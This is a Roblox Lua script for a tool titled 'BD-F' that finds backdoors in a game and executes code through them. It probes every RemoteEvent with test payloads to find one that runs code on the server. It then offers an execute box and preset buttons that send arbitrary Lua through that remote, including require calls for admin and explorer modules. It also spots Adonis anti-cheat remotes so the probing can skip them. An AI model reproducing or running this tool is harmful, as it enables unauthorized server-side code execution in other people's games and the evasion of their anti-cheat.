function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
ScreenGui0 = Instance.new("ScreenGui")
Frame1 = Instance.new("Frame")
LocalScript2 = Instance.new("LocalScript")
TextLabel3 = Instance.new("TextLabel")
LocalScript4 = Instance.new("LocalScript")
ObjectValue5 = Instance.new("ObjectValue")
Frame6 = Instance.new("Frame")
ScrollingFrame7 = Instance.new("ScrollingFrame")
TextButton8 = Instance.new("TextButton")
LocalScript9 = Instance.new("LocalScript")
TextButton10 = Instance.new("TextButton")
LocalScript11 = Instance.new("LocalScript")
TextButton12 = Instance.new("TextButton")
LocalScript13 = Instance.new("LocalScript")
TextButton14 = Instance.new("TextButton")
LocalScript15 = Instance.new("LocalScript")
TextButton16 = Instance.new("TextButton")
LocalScript17 = Instance.new("LocalScript")
TextBox18 = Instance.new("TextBox")
TextLabel19 = Instance.new("TextLabel")
LocalScript20 = Instance.new("LocalScript")
TextButton21 = Instance.new("TextButton")
LocalScript22 = Instance.new("LocalScript")
TextButton23 = Instance.new("TextButton")
LocalScript24 = Instance.new("LocalScript")
TextButton25 = Instance.new("TextButton")
LocalScript26 = Instance.new("LocalScript")
Frame27 = Instance.new("Frame")
LocalScript28 = Instance.new("LocalScript")
TextBox29 = Instance.new("TextBox")
LocalScript30 = Instance.new("LocalScript")
TextButton31 = Instance.new("TextButton")
LocalScript32 = Instance.new("LocalScript")
TextLabel33 = Instance.new("TextLabel")
TextButton34 = Instance.new("TextButton")
LocalScript35 = Instance.new("LocalScript")
StringValue36 = Instance.new("StringValue")
BoolValue37 = Instance.new("BoolValue")
StringValue38 = Instance.new("StringValue")
ScreenGui0.Name = "zza"
ScreenGui0.Parent = mas
ScreenGui0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Frame1.Name = "LoadingUI"
Frame1.Parent = ScreenGui0
Frame1.Position = UDim2.new(0.5, 0, -0.5, 0)
Frame1.Visible = false
Frame1.Size = UDim2.new(0, 301, 0, 100)
Frame1.Active = true
Frame1.AnchorPoint = Vector2.new(0.5, 0.5)
Frame1.BackgroundColor = BrickColor.new("Institutional white")
Frame1.BackgroundColor3 = Color3.new(1, 1, 1)
Frame1.BorderColor = BrickColor.new("Really black")
Frame1.BorderColor3 = Color3.new(0, 0, 0)
Frame1.BorderSizePixel = 0
Frame1.ZIndex = 0
local Gradient1 = Instance.new("UIGradient")
Gradient1.Name = "Gradient1"
Gradient1.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)),
})
Gradient1.Rotation = 230
Gradient1.Parent = Frame1

LocalScript2.Parent = Frame1
table.insert(cors,sandbox(LocalScript2,function()
repeat wait() until script.Parent.Parent:FindFirstChild("ready")

script.Parent.Visible = true

script.Parent.Position = UDim2.new(0.5,0,0.5,0)

script.Parent.Parent.ready:Destroy()

script.Parent.Parent.ResetOnSpawn = false

local isFunc = script.Parent.Parent.refunc

local txt = script.Parent.Status

txt.Text = [[Initialized!
Finding all RemoteEvents..
•Find RE backdoor
•Pass backdoored RE
•Load MainUI with fancy anims]]

wait(1)

local remotes = {}
for i,v in pairs(game:GetDescendants()) do
	if v:IsA("RemoteEvent") then
		print("Found remote: game."..v:GetFullName())
		remotes[i] = v
	end
end

txt.Text = [[Initialized!
Found all RemoteEvents!
Finding a backdoor..
•Pass backdoored RE
•Load MainUI with fancy anims]]

wait(0.1)

if isFunc == false then
	for i,remote in pairs(remotes) do
		if not string.match(script.Parent.Parent.exclude.Value, remote.Name) then
			remote:FireServer("local i = Instance.new('BoolValue') i.Name = 'i' i.Value = true i.Parent = game.ReplicatedStorage")
			wait(0.115)
			if game.ReplicatedStorage:FindFirstChild("i") then
				script.Parent.Parent.re.Value = remote
				txt.Text = [[Initialized!
Found all RemoteEvents!
Found a backdoor [String RE]!
Passed backdoor RE!
Loading MainUI...]]
				for k,v in pairs(remotes) do
					if v ~= remote then
						table.remove(remotes,table.find(remotes,v))
					end
				end
				game.ReplicatedStorage:FindFirstChild("i"):Destroy()
			end
		end
	end
end

wait(1)

if script.Parent.Parent.re.Value == nil then
	isFunc.Value = true
	for i,remote in pairs(remotes) do
		if not string.match(script.Parent.Parent.exclude.Value, remote.Name) then
			remote:FireServer(function() local i = Instance.new('BoolValue') i.Name = 'i' i.Value = true i.Parent = game.ReplicatedStorage end)
			wait(0.115)
			if game.ReplicatedStorage:FindFirstChild("i") then
				script.Parent.Parent.re.Value = remote
				txt.Text = [[Initialized!
Found all RemoteEvents!
Found a backdoor [Function RE]!
Passed backdoor RE!
Loading MainUI...]]
				for k,v in pairs(remotes) do
					if v ~= remote then
						table.remove(remotes,table.find(remotes,v))
					end
				end
				game.ReplicatedStorage:FindFirstChild("i"):Destroy()
			end
		end
	end
end

wait(1)

if script.Parent.Parent.re.Value == nil then
	txt.Text = [[Initialized!
Found all RemoteEvents!
Failed to find a backdoor!
•Pass backdoored RE
•Load MainUI with fancy anims]]
	wait(5)
	script.Disabled = true
	script.Parent.Parent:Destroy()
	return
else
	print("Found vulnerability: game."..script.Parent.Parent.re.Value:GetFullName())
end

wait(0.1)

txt.Text = [[Initialized!
Found all RemoteEvents!
Found a backdoor!
Passed backdoor RE!
Loaded MainUI!]]

local ts = game:GetService("TweenService")

local tp = UDim2.new(0.5, 0, -1, 0)

local ti = TweenInfo.new(2, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
local t = ts:Create(script.Parent, ti, {Position = tp})

t:Play()

wait(2)

script.Parent.Parent.MainUI.Visible = true
script.Parent.Parent.MainUI.Active = true

tp = UDim2.new(0.5,0,0.5,0)

t = ts:Create(script.Parent.Parent.MainUI, ti, {Position = tp})

t:Play()

wait(2)

script.Parent:Destroy()
end))
TextLabel3.Name = "Status"
TextLabel3.Parent = Frame1
TextLabel3.Size = UDim2.new(0, 301, 0, 100)
TextLabel3.BackgroundColor = BrickColor.new("Institutional white")
TextLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel3.BackgroundTransparency = 1
TextLabel3.BorderColor = BrickColor.new("Really black")
TextLabel3.BorderColor3 = Color3.new(0, 0, 0)
TextLabel3.BorderSizePixel = 0
TextLabel3.Font = Enum.Font.SourceSans
TextLabel3.FontSize = Enum.FontSize.Size18
TextLabel3.Text = "Initialized!"
TextLabel3.TextColor = BrickColor.new("Institutional white")
TextLabel3.TextColor3 = Color3.new(1, 1, 1)
TextLabel3.TextSize = 18
TextLabel3.TextWrap = true
TextLabel3.TextWrapped = true
TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
TextLabel3.TextYAlignment = Enum.TextYAlignment.Top
LocalScript4.Name = "drag"
LocalScript4.Parent = Frame1
table.insert(cors,sandbox(LocalScript4,function()

local UIS = game:GetService('UserInputService')
local frame = script.Parent
local dragToggle = nil
local dragSpeed = 0.25
local dragStart = nil
local startPos = nil

local function updateInput(input)
	local delta = input.Position - dragStart
	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
end

frame.InputBegan:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
		dragToggle = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)

UIS.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		if dragToggle then
			updateInput(input)
		end
	end
end)

end))
ObjectValue5.Name = "re"
ObjectValue5.Parent = ScreenGui0
Frame6.Name = "MainUI"
Frame6.Parent = ScreenGui0
Frame6.Position = UDim2.new(0.5, 0, -0.5, 0)
Frame6.Visible = false
Frame6.Size = UDim2.new(0, 248, 0, 147)
Frame6.Active = true
Frame6.AnchorPoint = Vector2.new(0.5, 0.5)
Frame6.BackgroundColor = BrickColor.new("Black metallic")
Frame6.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
Frame6.BorderColor = BrickColor.new("Really black")
Frame6.BorderColor3 = Color3.new(0, 0, 0)
Frame6.BorderSizePixel = 0
ScrollingFrame7.Name = "ScriptUI"
ScrollingFrame7.Parent = Frame6
ScrollingFrame7.Position = UDim2.new(0, 266, 0, 0)
ScrollingFrame7.Size = UDim2.new(0, 114, 0, 147)
ScrollingFrame7.Active = true
ScrollingFrame7.BackgroundColor = BrickColor.new("Black")
ScrollingFrame7.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
ScrollingFrame7.BorderColor = BrickColor.new("Really black")
ScrollingFrame7.BorderColor3 = Color3.new(0, 0, 0)
ScrollingFrame7.BorderSizePixel = 0
ScrollingFrame7.ScrollBarThickness = 6
TextButton8.Name = "f3x"
TextButton8.Parent = ScrollingFrame7
TextButton8.Size = UDim2.new(0, 108, 0, 16)
TextButton8.BackgroundColor = BrickColor.new("Black metallic")
TextButton8.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton8.BorderColor = BrickColor.new("Really black")
TextButton8.BorderColor3 = Color3.new(0, 0, 0)
TextButton8.BorderSizePixel = 0
TextButton8.Font = Enum.Font.Nunito
TextButton8.FontSize = Enum.FontSize.Size14
TextButton8.Text = "F3X"
TextButton8.TextColor = BrickColor.new("Really black")
TextButton8.TextColor3 = Color3.new(0, 0, 0)
TextButton8.TextScaled = true
TextButton8.TextSize = 14
TextButton8.TextWrap = true
TextButton8.TextWrapped = true
LocalScript9.Parent = TextButton8
table.insert(cors,sandbox(LocalScript9,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent.code.Text = "require(4869378421).F3X('%username%')"
end)
end))
TextButton10.Name = "dex"
TextButton10.Parent = ScrollingFrame7
TextButton10.Position = UDim2.new(0, 0, 0, 16)
TextButton10.Size = UDim2.new(0, 108, 0, 16)
TextButton10.BackgroundColor = BrickColor.new("Black metallic")
TextButton10.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton10.BorderColor = BrickColor.new("Really black")
TextButton10.BorderColor3 = Color3.new(0, 0, 0)
TextButton10.BorderSizePixel = 0
TextButton10.Font = Enum.Font.Nunito
TextButton10.FontSize = Enum.FontSize.Size14
TextButton10.Text = "Dex"
TextButton10.TextColor = BrickColor.new("Really black")
TextButton10.TextColor3 = Color3.new(0, 0, 0)
TextButton10.TextScaled = true
TextButton10.TextSize = 14
TextButton10.TextWrap = true
TextButton10.TextWrapped = true
LocalScript11.Parent = TextButton10
table.insert(cors,sandbox(LocalScript11,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent.code.Text = "require(4786706026):dex('%username%')"
end)
end))
TextButton12.Name = "h-loversgui"
TextButton12.Parent = ScrollingFrame7
TextButton12.Position = UDim2.new(0, 0, 0, 32)
TextButton12.Size = UDim2.new(0, 108, 0, 16)
TextButton12.BackgroundColor = BrickColor.new("Black metallic")
TextButton12.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton12.BorderColor = BrickColor.new("Really black")
TextButton12.BorderColor3 = Color3.new(0, 0, 0)
TextButton12.BorderSizePixel = 0
TextButton12.Font = Enum.Font.Nunito
TextButton12.FontSize = Enum.FontSize.Size14
TextButton12.Text = "H-LoversGUI"
TextButton12.TextColor = BrickColor.new("Really black")
TextButton12.TextColor3 = Color3.new(0, 0, 0)
TextButton12.TextScaled = true
TextButton12.TextSize = 14
TextButton12.TextWrap = true
TextButton12.TextWrapped = true
LocalScript13.Parent = TextButton12
table.insert(cors,sandbox(LocalScript13,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent.code.Text = "require(5346235551).B1847('%username%')"
end)
end))
TextButton14.Name = "r6"
TextButton14.Parent = ScrollingFrame7
TextButton14.Position = UDim2.new(0, 0, 0, 48)
TextButton14.Size = UDim2.new(0, 108, 0, 16)
TextButton14.BackgroundColor = BrickColor.new("Black metallic")
TextButton14.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton14.BorderColor = BrickColor.new("Really black")
TextButton14.BorderColor3 = Color3.new(0, 0, 0)
TextButton14.BorderSizePixel = 0
TextButton14.Font = Enum.Font.Nunito
TextButton14.FontSize = Enum.FontSize.Size14
TextButton14.Text = "R6"
TextButton14.TextColor = BrickColor.new("Really black")
TextButton14.TextColor3 = Color3.new(0, 0, 0)
TextButton14.TextScaled = true
TextButton14.TextSize = 14
TextButton14.TextWrap = true
TextButton14.TextWrapped = true
LocalScript15.Parent = TextButton14
table.insert(cors,sandbox(LocalScript15,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent.code.Text = "require(4585652241).load('%username%')"
end)
end))
TextButton16.Name = "originalchar"
TextButton16.Parent = ScrollingFrame7
TextButton16.Position = UDim2.new(0, 0, 0, 64)
TextButton16.Size = UDim2.new(0, 108, 0, 16)
TextButton16.BackgroundColor = BrickColor.new("Black metallic")
TextButton16.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton16.BorderColor = BrickColor.new("Really black")
TextButton16.BorderColor3 = Color3.new(0, 0, 0)
TextButton16.BorderSizePixel = 0
TextButton16.Font = Enum.Font.Nunito
TextButton16.FontSize = Enum.FontSize.Size14
TextButton16.Text = "balloriginalchar"
TextButton16.TextColor = BrickColor.new("Really black")
TextButton16.TextColor3 = Color3.new(0, 0, 0)
TextButton16.TextScaled = true
TextButton16.TextSize = 14
TextButton16.TextWrap = true
TextButton16.TextWrapped = true
LocalScript17.Parent = TextButton16
table.insert(cors,sandbox(LocalScript17,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent.code.Text = "game.Players.%username%:LoadCharacter() game.Players.%username%.Character.LeftFoot.CFrame = game.Workspace.%username%.%username%.CFrame game.Workspace.%username%:Destroy()"
end)
end))
TextBox18.Name = "code"
TextBox18.Parent = Frame6
TextBox18.Position = UDim2.new(0, 0, 0, 16)
TextBox18.Size = UDim2.new(0, 248, 0, 98)
TextBox18.BackgroundColor = BrickColor.new("Black")
TextBox18.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextBox18.BorderColor = BrickColor.new("Really black")
TextBox18.BorderColor3 = Color3.new(0, 0, 0)
TextBox18.BorderSizePixel = 0
TextBox18.Font = Enum.Font.SourceSans
TextBox18.FontSize = Enum.FontSize.Size14
TextBox18.Text = ""
TextBox18.TextColor = BrickColor.new("Really black")
TextBox18.TextColor3 = Color3.new(0, 0, 0)
TextBox18.TextSize = 14
TextBox18.TextWrap = true
TextBox18.TextWrapped = true
TextBox18.TextXAlignment = Enum.TextXAlignment.Left
TextBox18.TextYAlignment = Enum.TextYAlignment.Top
TextBox18.ClearTextOnFocus = false
TextBox18.MultiLine = true
TextLabel19.Name = "name"
TextLabel19.Parent = Frame6
TextLabel19.Size = UDim2.new(0, 248, 0, 17)
TextLabel19.BackgroundColor = BrickColor.new("Institutional white")
TextLabel19.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel19.BackgroundTransparency = 1
TextLabel19.BorderColor = BrickColor.new("Really black")
TextLabel19.BorderColor3 = Color3.new(0, 0, 0)
TextLabel19.BorderSizePixel = 0
TextLabel19.Font = Enum.Font.SourceSansBold
TextLabel19.FontSize = Enum.FontSize.Size14
TextLabel19.Text = "BD-F (Credits - AlmousMarvelous, QuickQuarnt)"
TextLabel19.TextColor = BrickColor.new("Institutional white")
TextLabel19.TextColor3 = Color3.new(1, 1, 1)
TextLabel19.TextScaled = true
TextLabel19.TextSize = 14
TextLabel19.TextWrap = true
TextLabel19.TextWrapped = true
LocalScript20.Name = "drag"
LocalScript20.Parent = TextLabel19
table.insert(cors,sandbox(LocalScript20,function()
local UIS = game:GetService('UserInputService')
local frame = script.Parent.Parent
local dragToggle = nil
local dragSpeed = 0.5
local dragStart = nil
local startPos = nil

local function updateInput(input)
	local delta = input.Position - dragStart
	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
end

frame.InputBegan:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
		dragToggle = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)

UIS.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		if dragToggle then
			updateInput(input)
		end
	end
end)

end))
TextButton21.Name = "Run"
TextButton21.Parent = Frame6
TextButton21.Position = UDim2.new(0, 7, 0, 119)
TextButton21.Size = UDim2.new(0, 76, 0, 21)
TextButton21.BackgroundColor = BrickColor.new("Black")
TextButton21.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton21.BorderColor = BrickColor.new("Really black")
TextButton21.BorderColor3 = Color3.new(0, 0, 0)
TextButton21.BorderSizePixel = 0
TextButton21.Font = Enum.Font.Nunito
TextButton21.FontSize = Enum.FontSize.Size14
TextButton21.Text = "Execute"
TextButton21.TextColor = BrickColor.new("Really black")
TextButton21.TextColor3 = Color3.new(0, 0, 0)
TextButton21.TextScaled = true
TextButton21.TextSize = 14
TextButton21.TextWrap = true
TextButton21.TextWrapped = true
LocalScript22.Parent = TextButton21
table.insert(cors,sandbox(LocalScript22,function()
script.Parent.MouseButton1Down:Connect(function()
	local code = script.Parent.Parent.code.Text
	local re = script.Parent.Parent.Parent.re.Value

	code = string.gsub(code, "%%username%%", game.Players.LocalPlayer.Name)
	
	print(code)

	re:FireServer(tostring(code))
end)
end))
TextButton23.Name = "Clear"
TextButton23.Parent = Frame6
TextButton23.Position = UDim2.new(0, 87, 0, 119)
TextButton23.Size = UDim2.new(0, 76, 0, 21)
TextButton23.BackgroundColor = BrickColor.new("Black")
TextButton23.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton23.BorderColor = BrickColor.new("Really black")
TextButton23.BorderColor3 = Color3.new(0, 0, 0)
TextButton23.BorderSizePixel = 0
TextButton23.Font = Enum.Font.Nunito
TextButton23.FontSize = Enum.FontSize.Size14
TextButton23.Text = "Clear"
TextButton23.TextColor = BrickColor.new("Really black")
TextButton23.TextColor3 = Color3.new(0, 0, 0)
TextButton23.TextScaled = true
TextButton23.TextSize = 14
TextButton23.TextWrap = true
TextButton23.TextWrapped = true
LocalScript24.Parent = TextButton23
table.insert(cors,sandbox(LocalScript24,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.code.Text = "";
end)
end))
TextButton25.Name = "Exit"
TextButton25.Parent = Frame6
TextButton25.Position = UDim2.new(0, 166, 0, 119)
TextButton25.Size = UDim2.new(0, 76, 0, 21)
TextButton25.BackgroundColor = BrickColor.new("Black")
TextButton25.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton25.BorderColor = BrickColor.new("Really black")
TextButton25.BorderColor3 = Color3.new(0, 0, 0)
TextButton25.BorderSizePixel = 0
TextButton25.Font = Enum.Font.Nunito
TextButton25.FontSize = Enum.FontSize.Size14
TextButton25.Text = "Exit"
TextButton25.TextColor = BrickColor.new("Really black")
TextButton25.TextColor3 = Color3.new(0, 0, 0)
TextButton25.TextScaled = true
TextButton25.TextSize = 14
TextButton25.TextWrap = true
TextButton25.TextWrapped = true
LocalScript26.Parent = TextButton25
table.insert(cors,sandbox(LocalScript26,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent:Destroy()
end)
end))
Frame27.Name = "ExclusionUI"
Frame27.Parent = ScreenGui0
Frame27.Position = UDim2.new(0.499078393, 0, 0.499235392, 0)
Frame27.Size = UDim2.new(0, 301, 0, 100)
Frame27.Active = true
Frame27.AnchorPoint = Vector2.new(0.5, 0.5)
Frame27.BackgroundColor = BrickColor.new("Institutional white")
Frame27.BackgroundColor3 = Color3.new(1, 1, 1)
Frame27.BorderColor = BrickColor.new("Really black")
Frame27.BorderColor3 = Color3.new(0, 0, 0)
Frame27.BorderSizePixel = 0
Frame27.ZIndex = 0
local Gradient2 = Instance.new("UIGradient")
Gradient2.Name = "Gradient1"
Gradient2.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)),
})
Gradient2.Rotation = 230
Gradient2.Parent = Frame27

LocalScript28.Name = "drag"
LocalScript28.Parent = Frame27
table.insert(cors,sandbox(LocalScript28,function()
local UIS = game:GetService('UserInputService')
local frame = script.Parent
local dragToggle = nil
local dragSpeed = 0.25
local dragStart = nil
local startPos = nil

local function updateInput(input)
	local delta = input.Position - dragStart
	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
end

frame.InputBegan:Connect(function(input)
	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
		dragToggle = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)

UIS.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		if dragToggle then
			updateInput(input)
		end
	end
end)

end))
TextBox29.Parent = Frame27
TextBox29.Position = UDim2.new(0, 0, 0.123609617, 0)
TextBox29.Size = UDim2.new(0, 301, 0, 63)
TextBox29.BackgroundColor = BrickColor.new("Institutional white")
TextBox29.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox29.BackgroundTransparency = 1
TextBox29.BorderColor = BrickColor.new("Really black")
TextBox29.BorderColor3 = Color3.new(0, 0, 0)
TextBox29.BorderSizePixel = 0
TextBox29.Font = Enum.Font.SourceSans
TextBox29.FontSize = Enum.FontSize.Size18
TextBox29.Text = ""
TextBox29.TextColor = BrickColor.new("Institutional white")
TextBox29.TextColor3 = Color3.new(1, 1, 1)
TextBox29.TextSize = 18
TextBox29.TextWrap = true
TextBox29.TextWrapped = true
TextBox29.ClearTextOnFocus = false
TextBox29.TextXAlignment = Enum.TextXAlignment.Left
TextBox29.TextYAlignment = Enum.TextYAlignment.Top
TextBox29.PlaceholderColor3 = Color3.new(0.784314, 0.784314, 0.784314)
TextBox29.PlaceholderText = "List all RemoteEvent names to exclude.."
LocalScript30.Parent = TextBox29
table.insert(cors,sandbox(LocalScript30,function()
local suggest = script.Parent.Parent.Parent.suggest

for i,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
	if v.Name == "__FUNCTION" then
		script.Parent.PlaceholderText = [[Suggestions:
		]]..v.Parent.Name..[[ - Adonis AntiCheat
		]]
		
		suggest.Value = suggest.Value.." "..v.Parent.Name
	end
end
end))
TextButton31.Name = "Exclude"
TextButton31.Parent = Frame27
TextButton31.Position = UDim2.new(0, 0, 0, 77)
TextButton31.Size = UDim2.new(0, 145, 0, 23)
TextButton31.BackgroundColor = BrickColor.new("Black")
TextButton31.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton31.BorderColor = BrickColor.new("Really black")
TextButton31.BorderColor3 = Color3.new(0, 0, 0)
TextButton31.BorderSizePixel = 0
TextButton31.Font = Enum.Font.Nunito
TextButton31.FontSize = Enum.FontSize.Size14
TextButton31.Text = "Exclude"
TextButton31.TextColor = BrickColor.new("Really black")
TextButton31.TextColor3 = Color3.new(0, 0, 0)
TextButton31.TextScaled = true
TextButton31.TextSize = 14
TextButton31.TextWrap = true
TextButton31.TextWrapped = true
LocalScript32.Parent = TextButton31
table.insert(cors,sandbox(LocalScript32,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent.exclude.Value = script.Parent.Parent.TextBox.Text
	local rdy = Instance.new("BoolValue")
	rdy.Name = "ready"
	rdy.Value = true
	rdy.Parent = script.Parent.Parent.Parent
	script.Parent.Parent:Destroy()
end)
end))
TextLabel33.Name = "title"
TextLabel33.Parent = Frame27
TextLabel33.Position = UDim2.new(0, 0, -0.00639038067, 0)
TextLabel33.Size = UDim2.new(0, 301, 0, 13)
TextLabel33.BackgroundColor = BrickColor.new("Black")
TextLabel33.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextLabel33.BorderColor = BrickColor.new("Really black")
TextLabel33.BorderColor3 = Color3.new(0, 0, 0)
TextLabel33.BorderSizePixel = 0
TextLabel33.Font = Enum.Font.SourceSansBold
TextLabel33.FontSize = Enum.FontSize.Size14
TextLabel33.Text = "BD-F - Credits to QuickQuarnt & AlmousMarvelous"
TextLabel33.TextColor = BrickColor.new("Institutional white")
TextLabel33.TextColor3 = Color3.new(1, 1, 1)
TextLabel33.TextSize = 14
TextLabel33.TextWrap = true
TextLabel33.TextWrapped = true
TextLabel33.TextXAlignment = Enum.TextXAlignment.Left
TextButton34.Name = "Add Suggestions"
TextButton34.Parent = Frame27
TextButton34.Position = UDim2.new(0, 151, 0, 77)
TextButton34.Size = UDim2.new(0, 150, 0, 23)
TextButton34.BackgroundColor = BrickColor.new("Black")
TextButton34.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton34.BorderColor = BrickColor.new("Really black")
TextButton34.BorderColor3 = Color3.new(0, 0, 0)
TextButton34.BorderSizePixel = 0
TextButton34.Font = Enum.Font.Nunito
TextButton34.FontSize = Enum.FontSize.Size14
TextButton34.Text = "Add Suggestions"
TextButton34.TextColor = BrickColor.new("Really black")
TextButton34.TextColor3 = Color3.new(0, 0, 0)
TextButton34.TextScaled = true
TextButton34.TextSize = 14
TextButton34.TextWrap = true
TextButton34.TextWrapped = true
LocalScript35.Parent = TextButton34
table.insert(cors,sandbox(LocalScript35,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.TextBox.Text = script.Parent.Parent.TextBox.Text.." "..script.Parent.Parent.Parent.suggest.Value
end)
end))
StringValue36.Name = "exclude"
StringValue36.Parent = ScreenGui0
BoolValue37.Name = "refunc"
BoolValue37.Parent = ScreenGui0
StringValue38.Name = "suggest"
StringValue38.Parent = ScreenGui0
for i,v in pairs(mas:GetChildren()) do
	v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
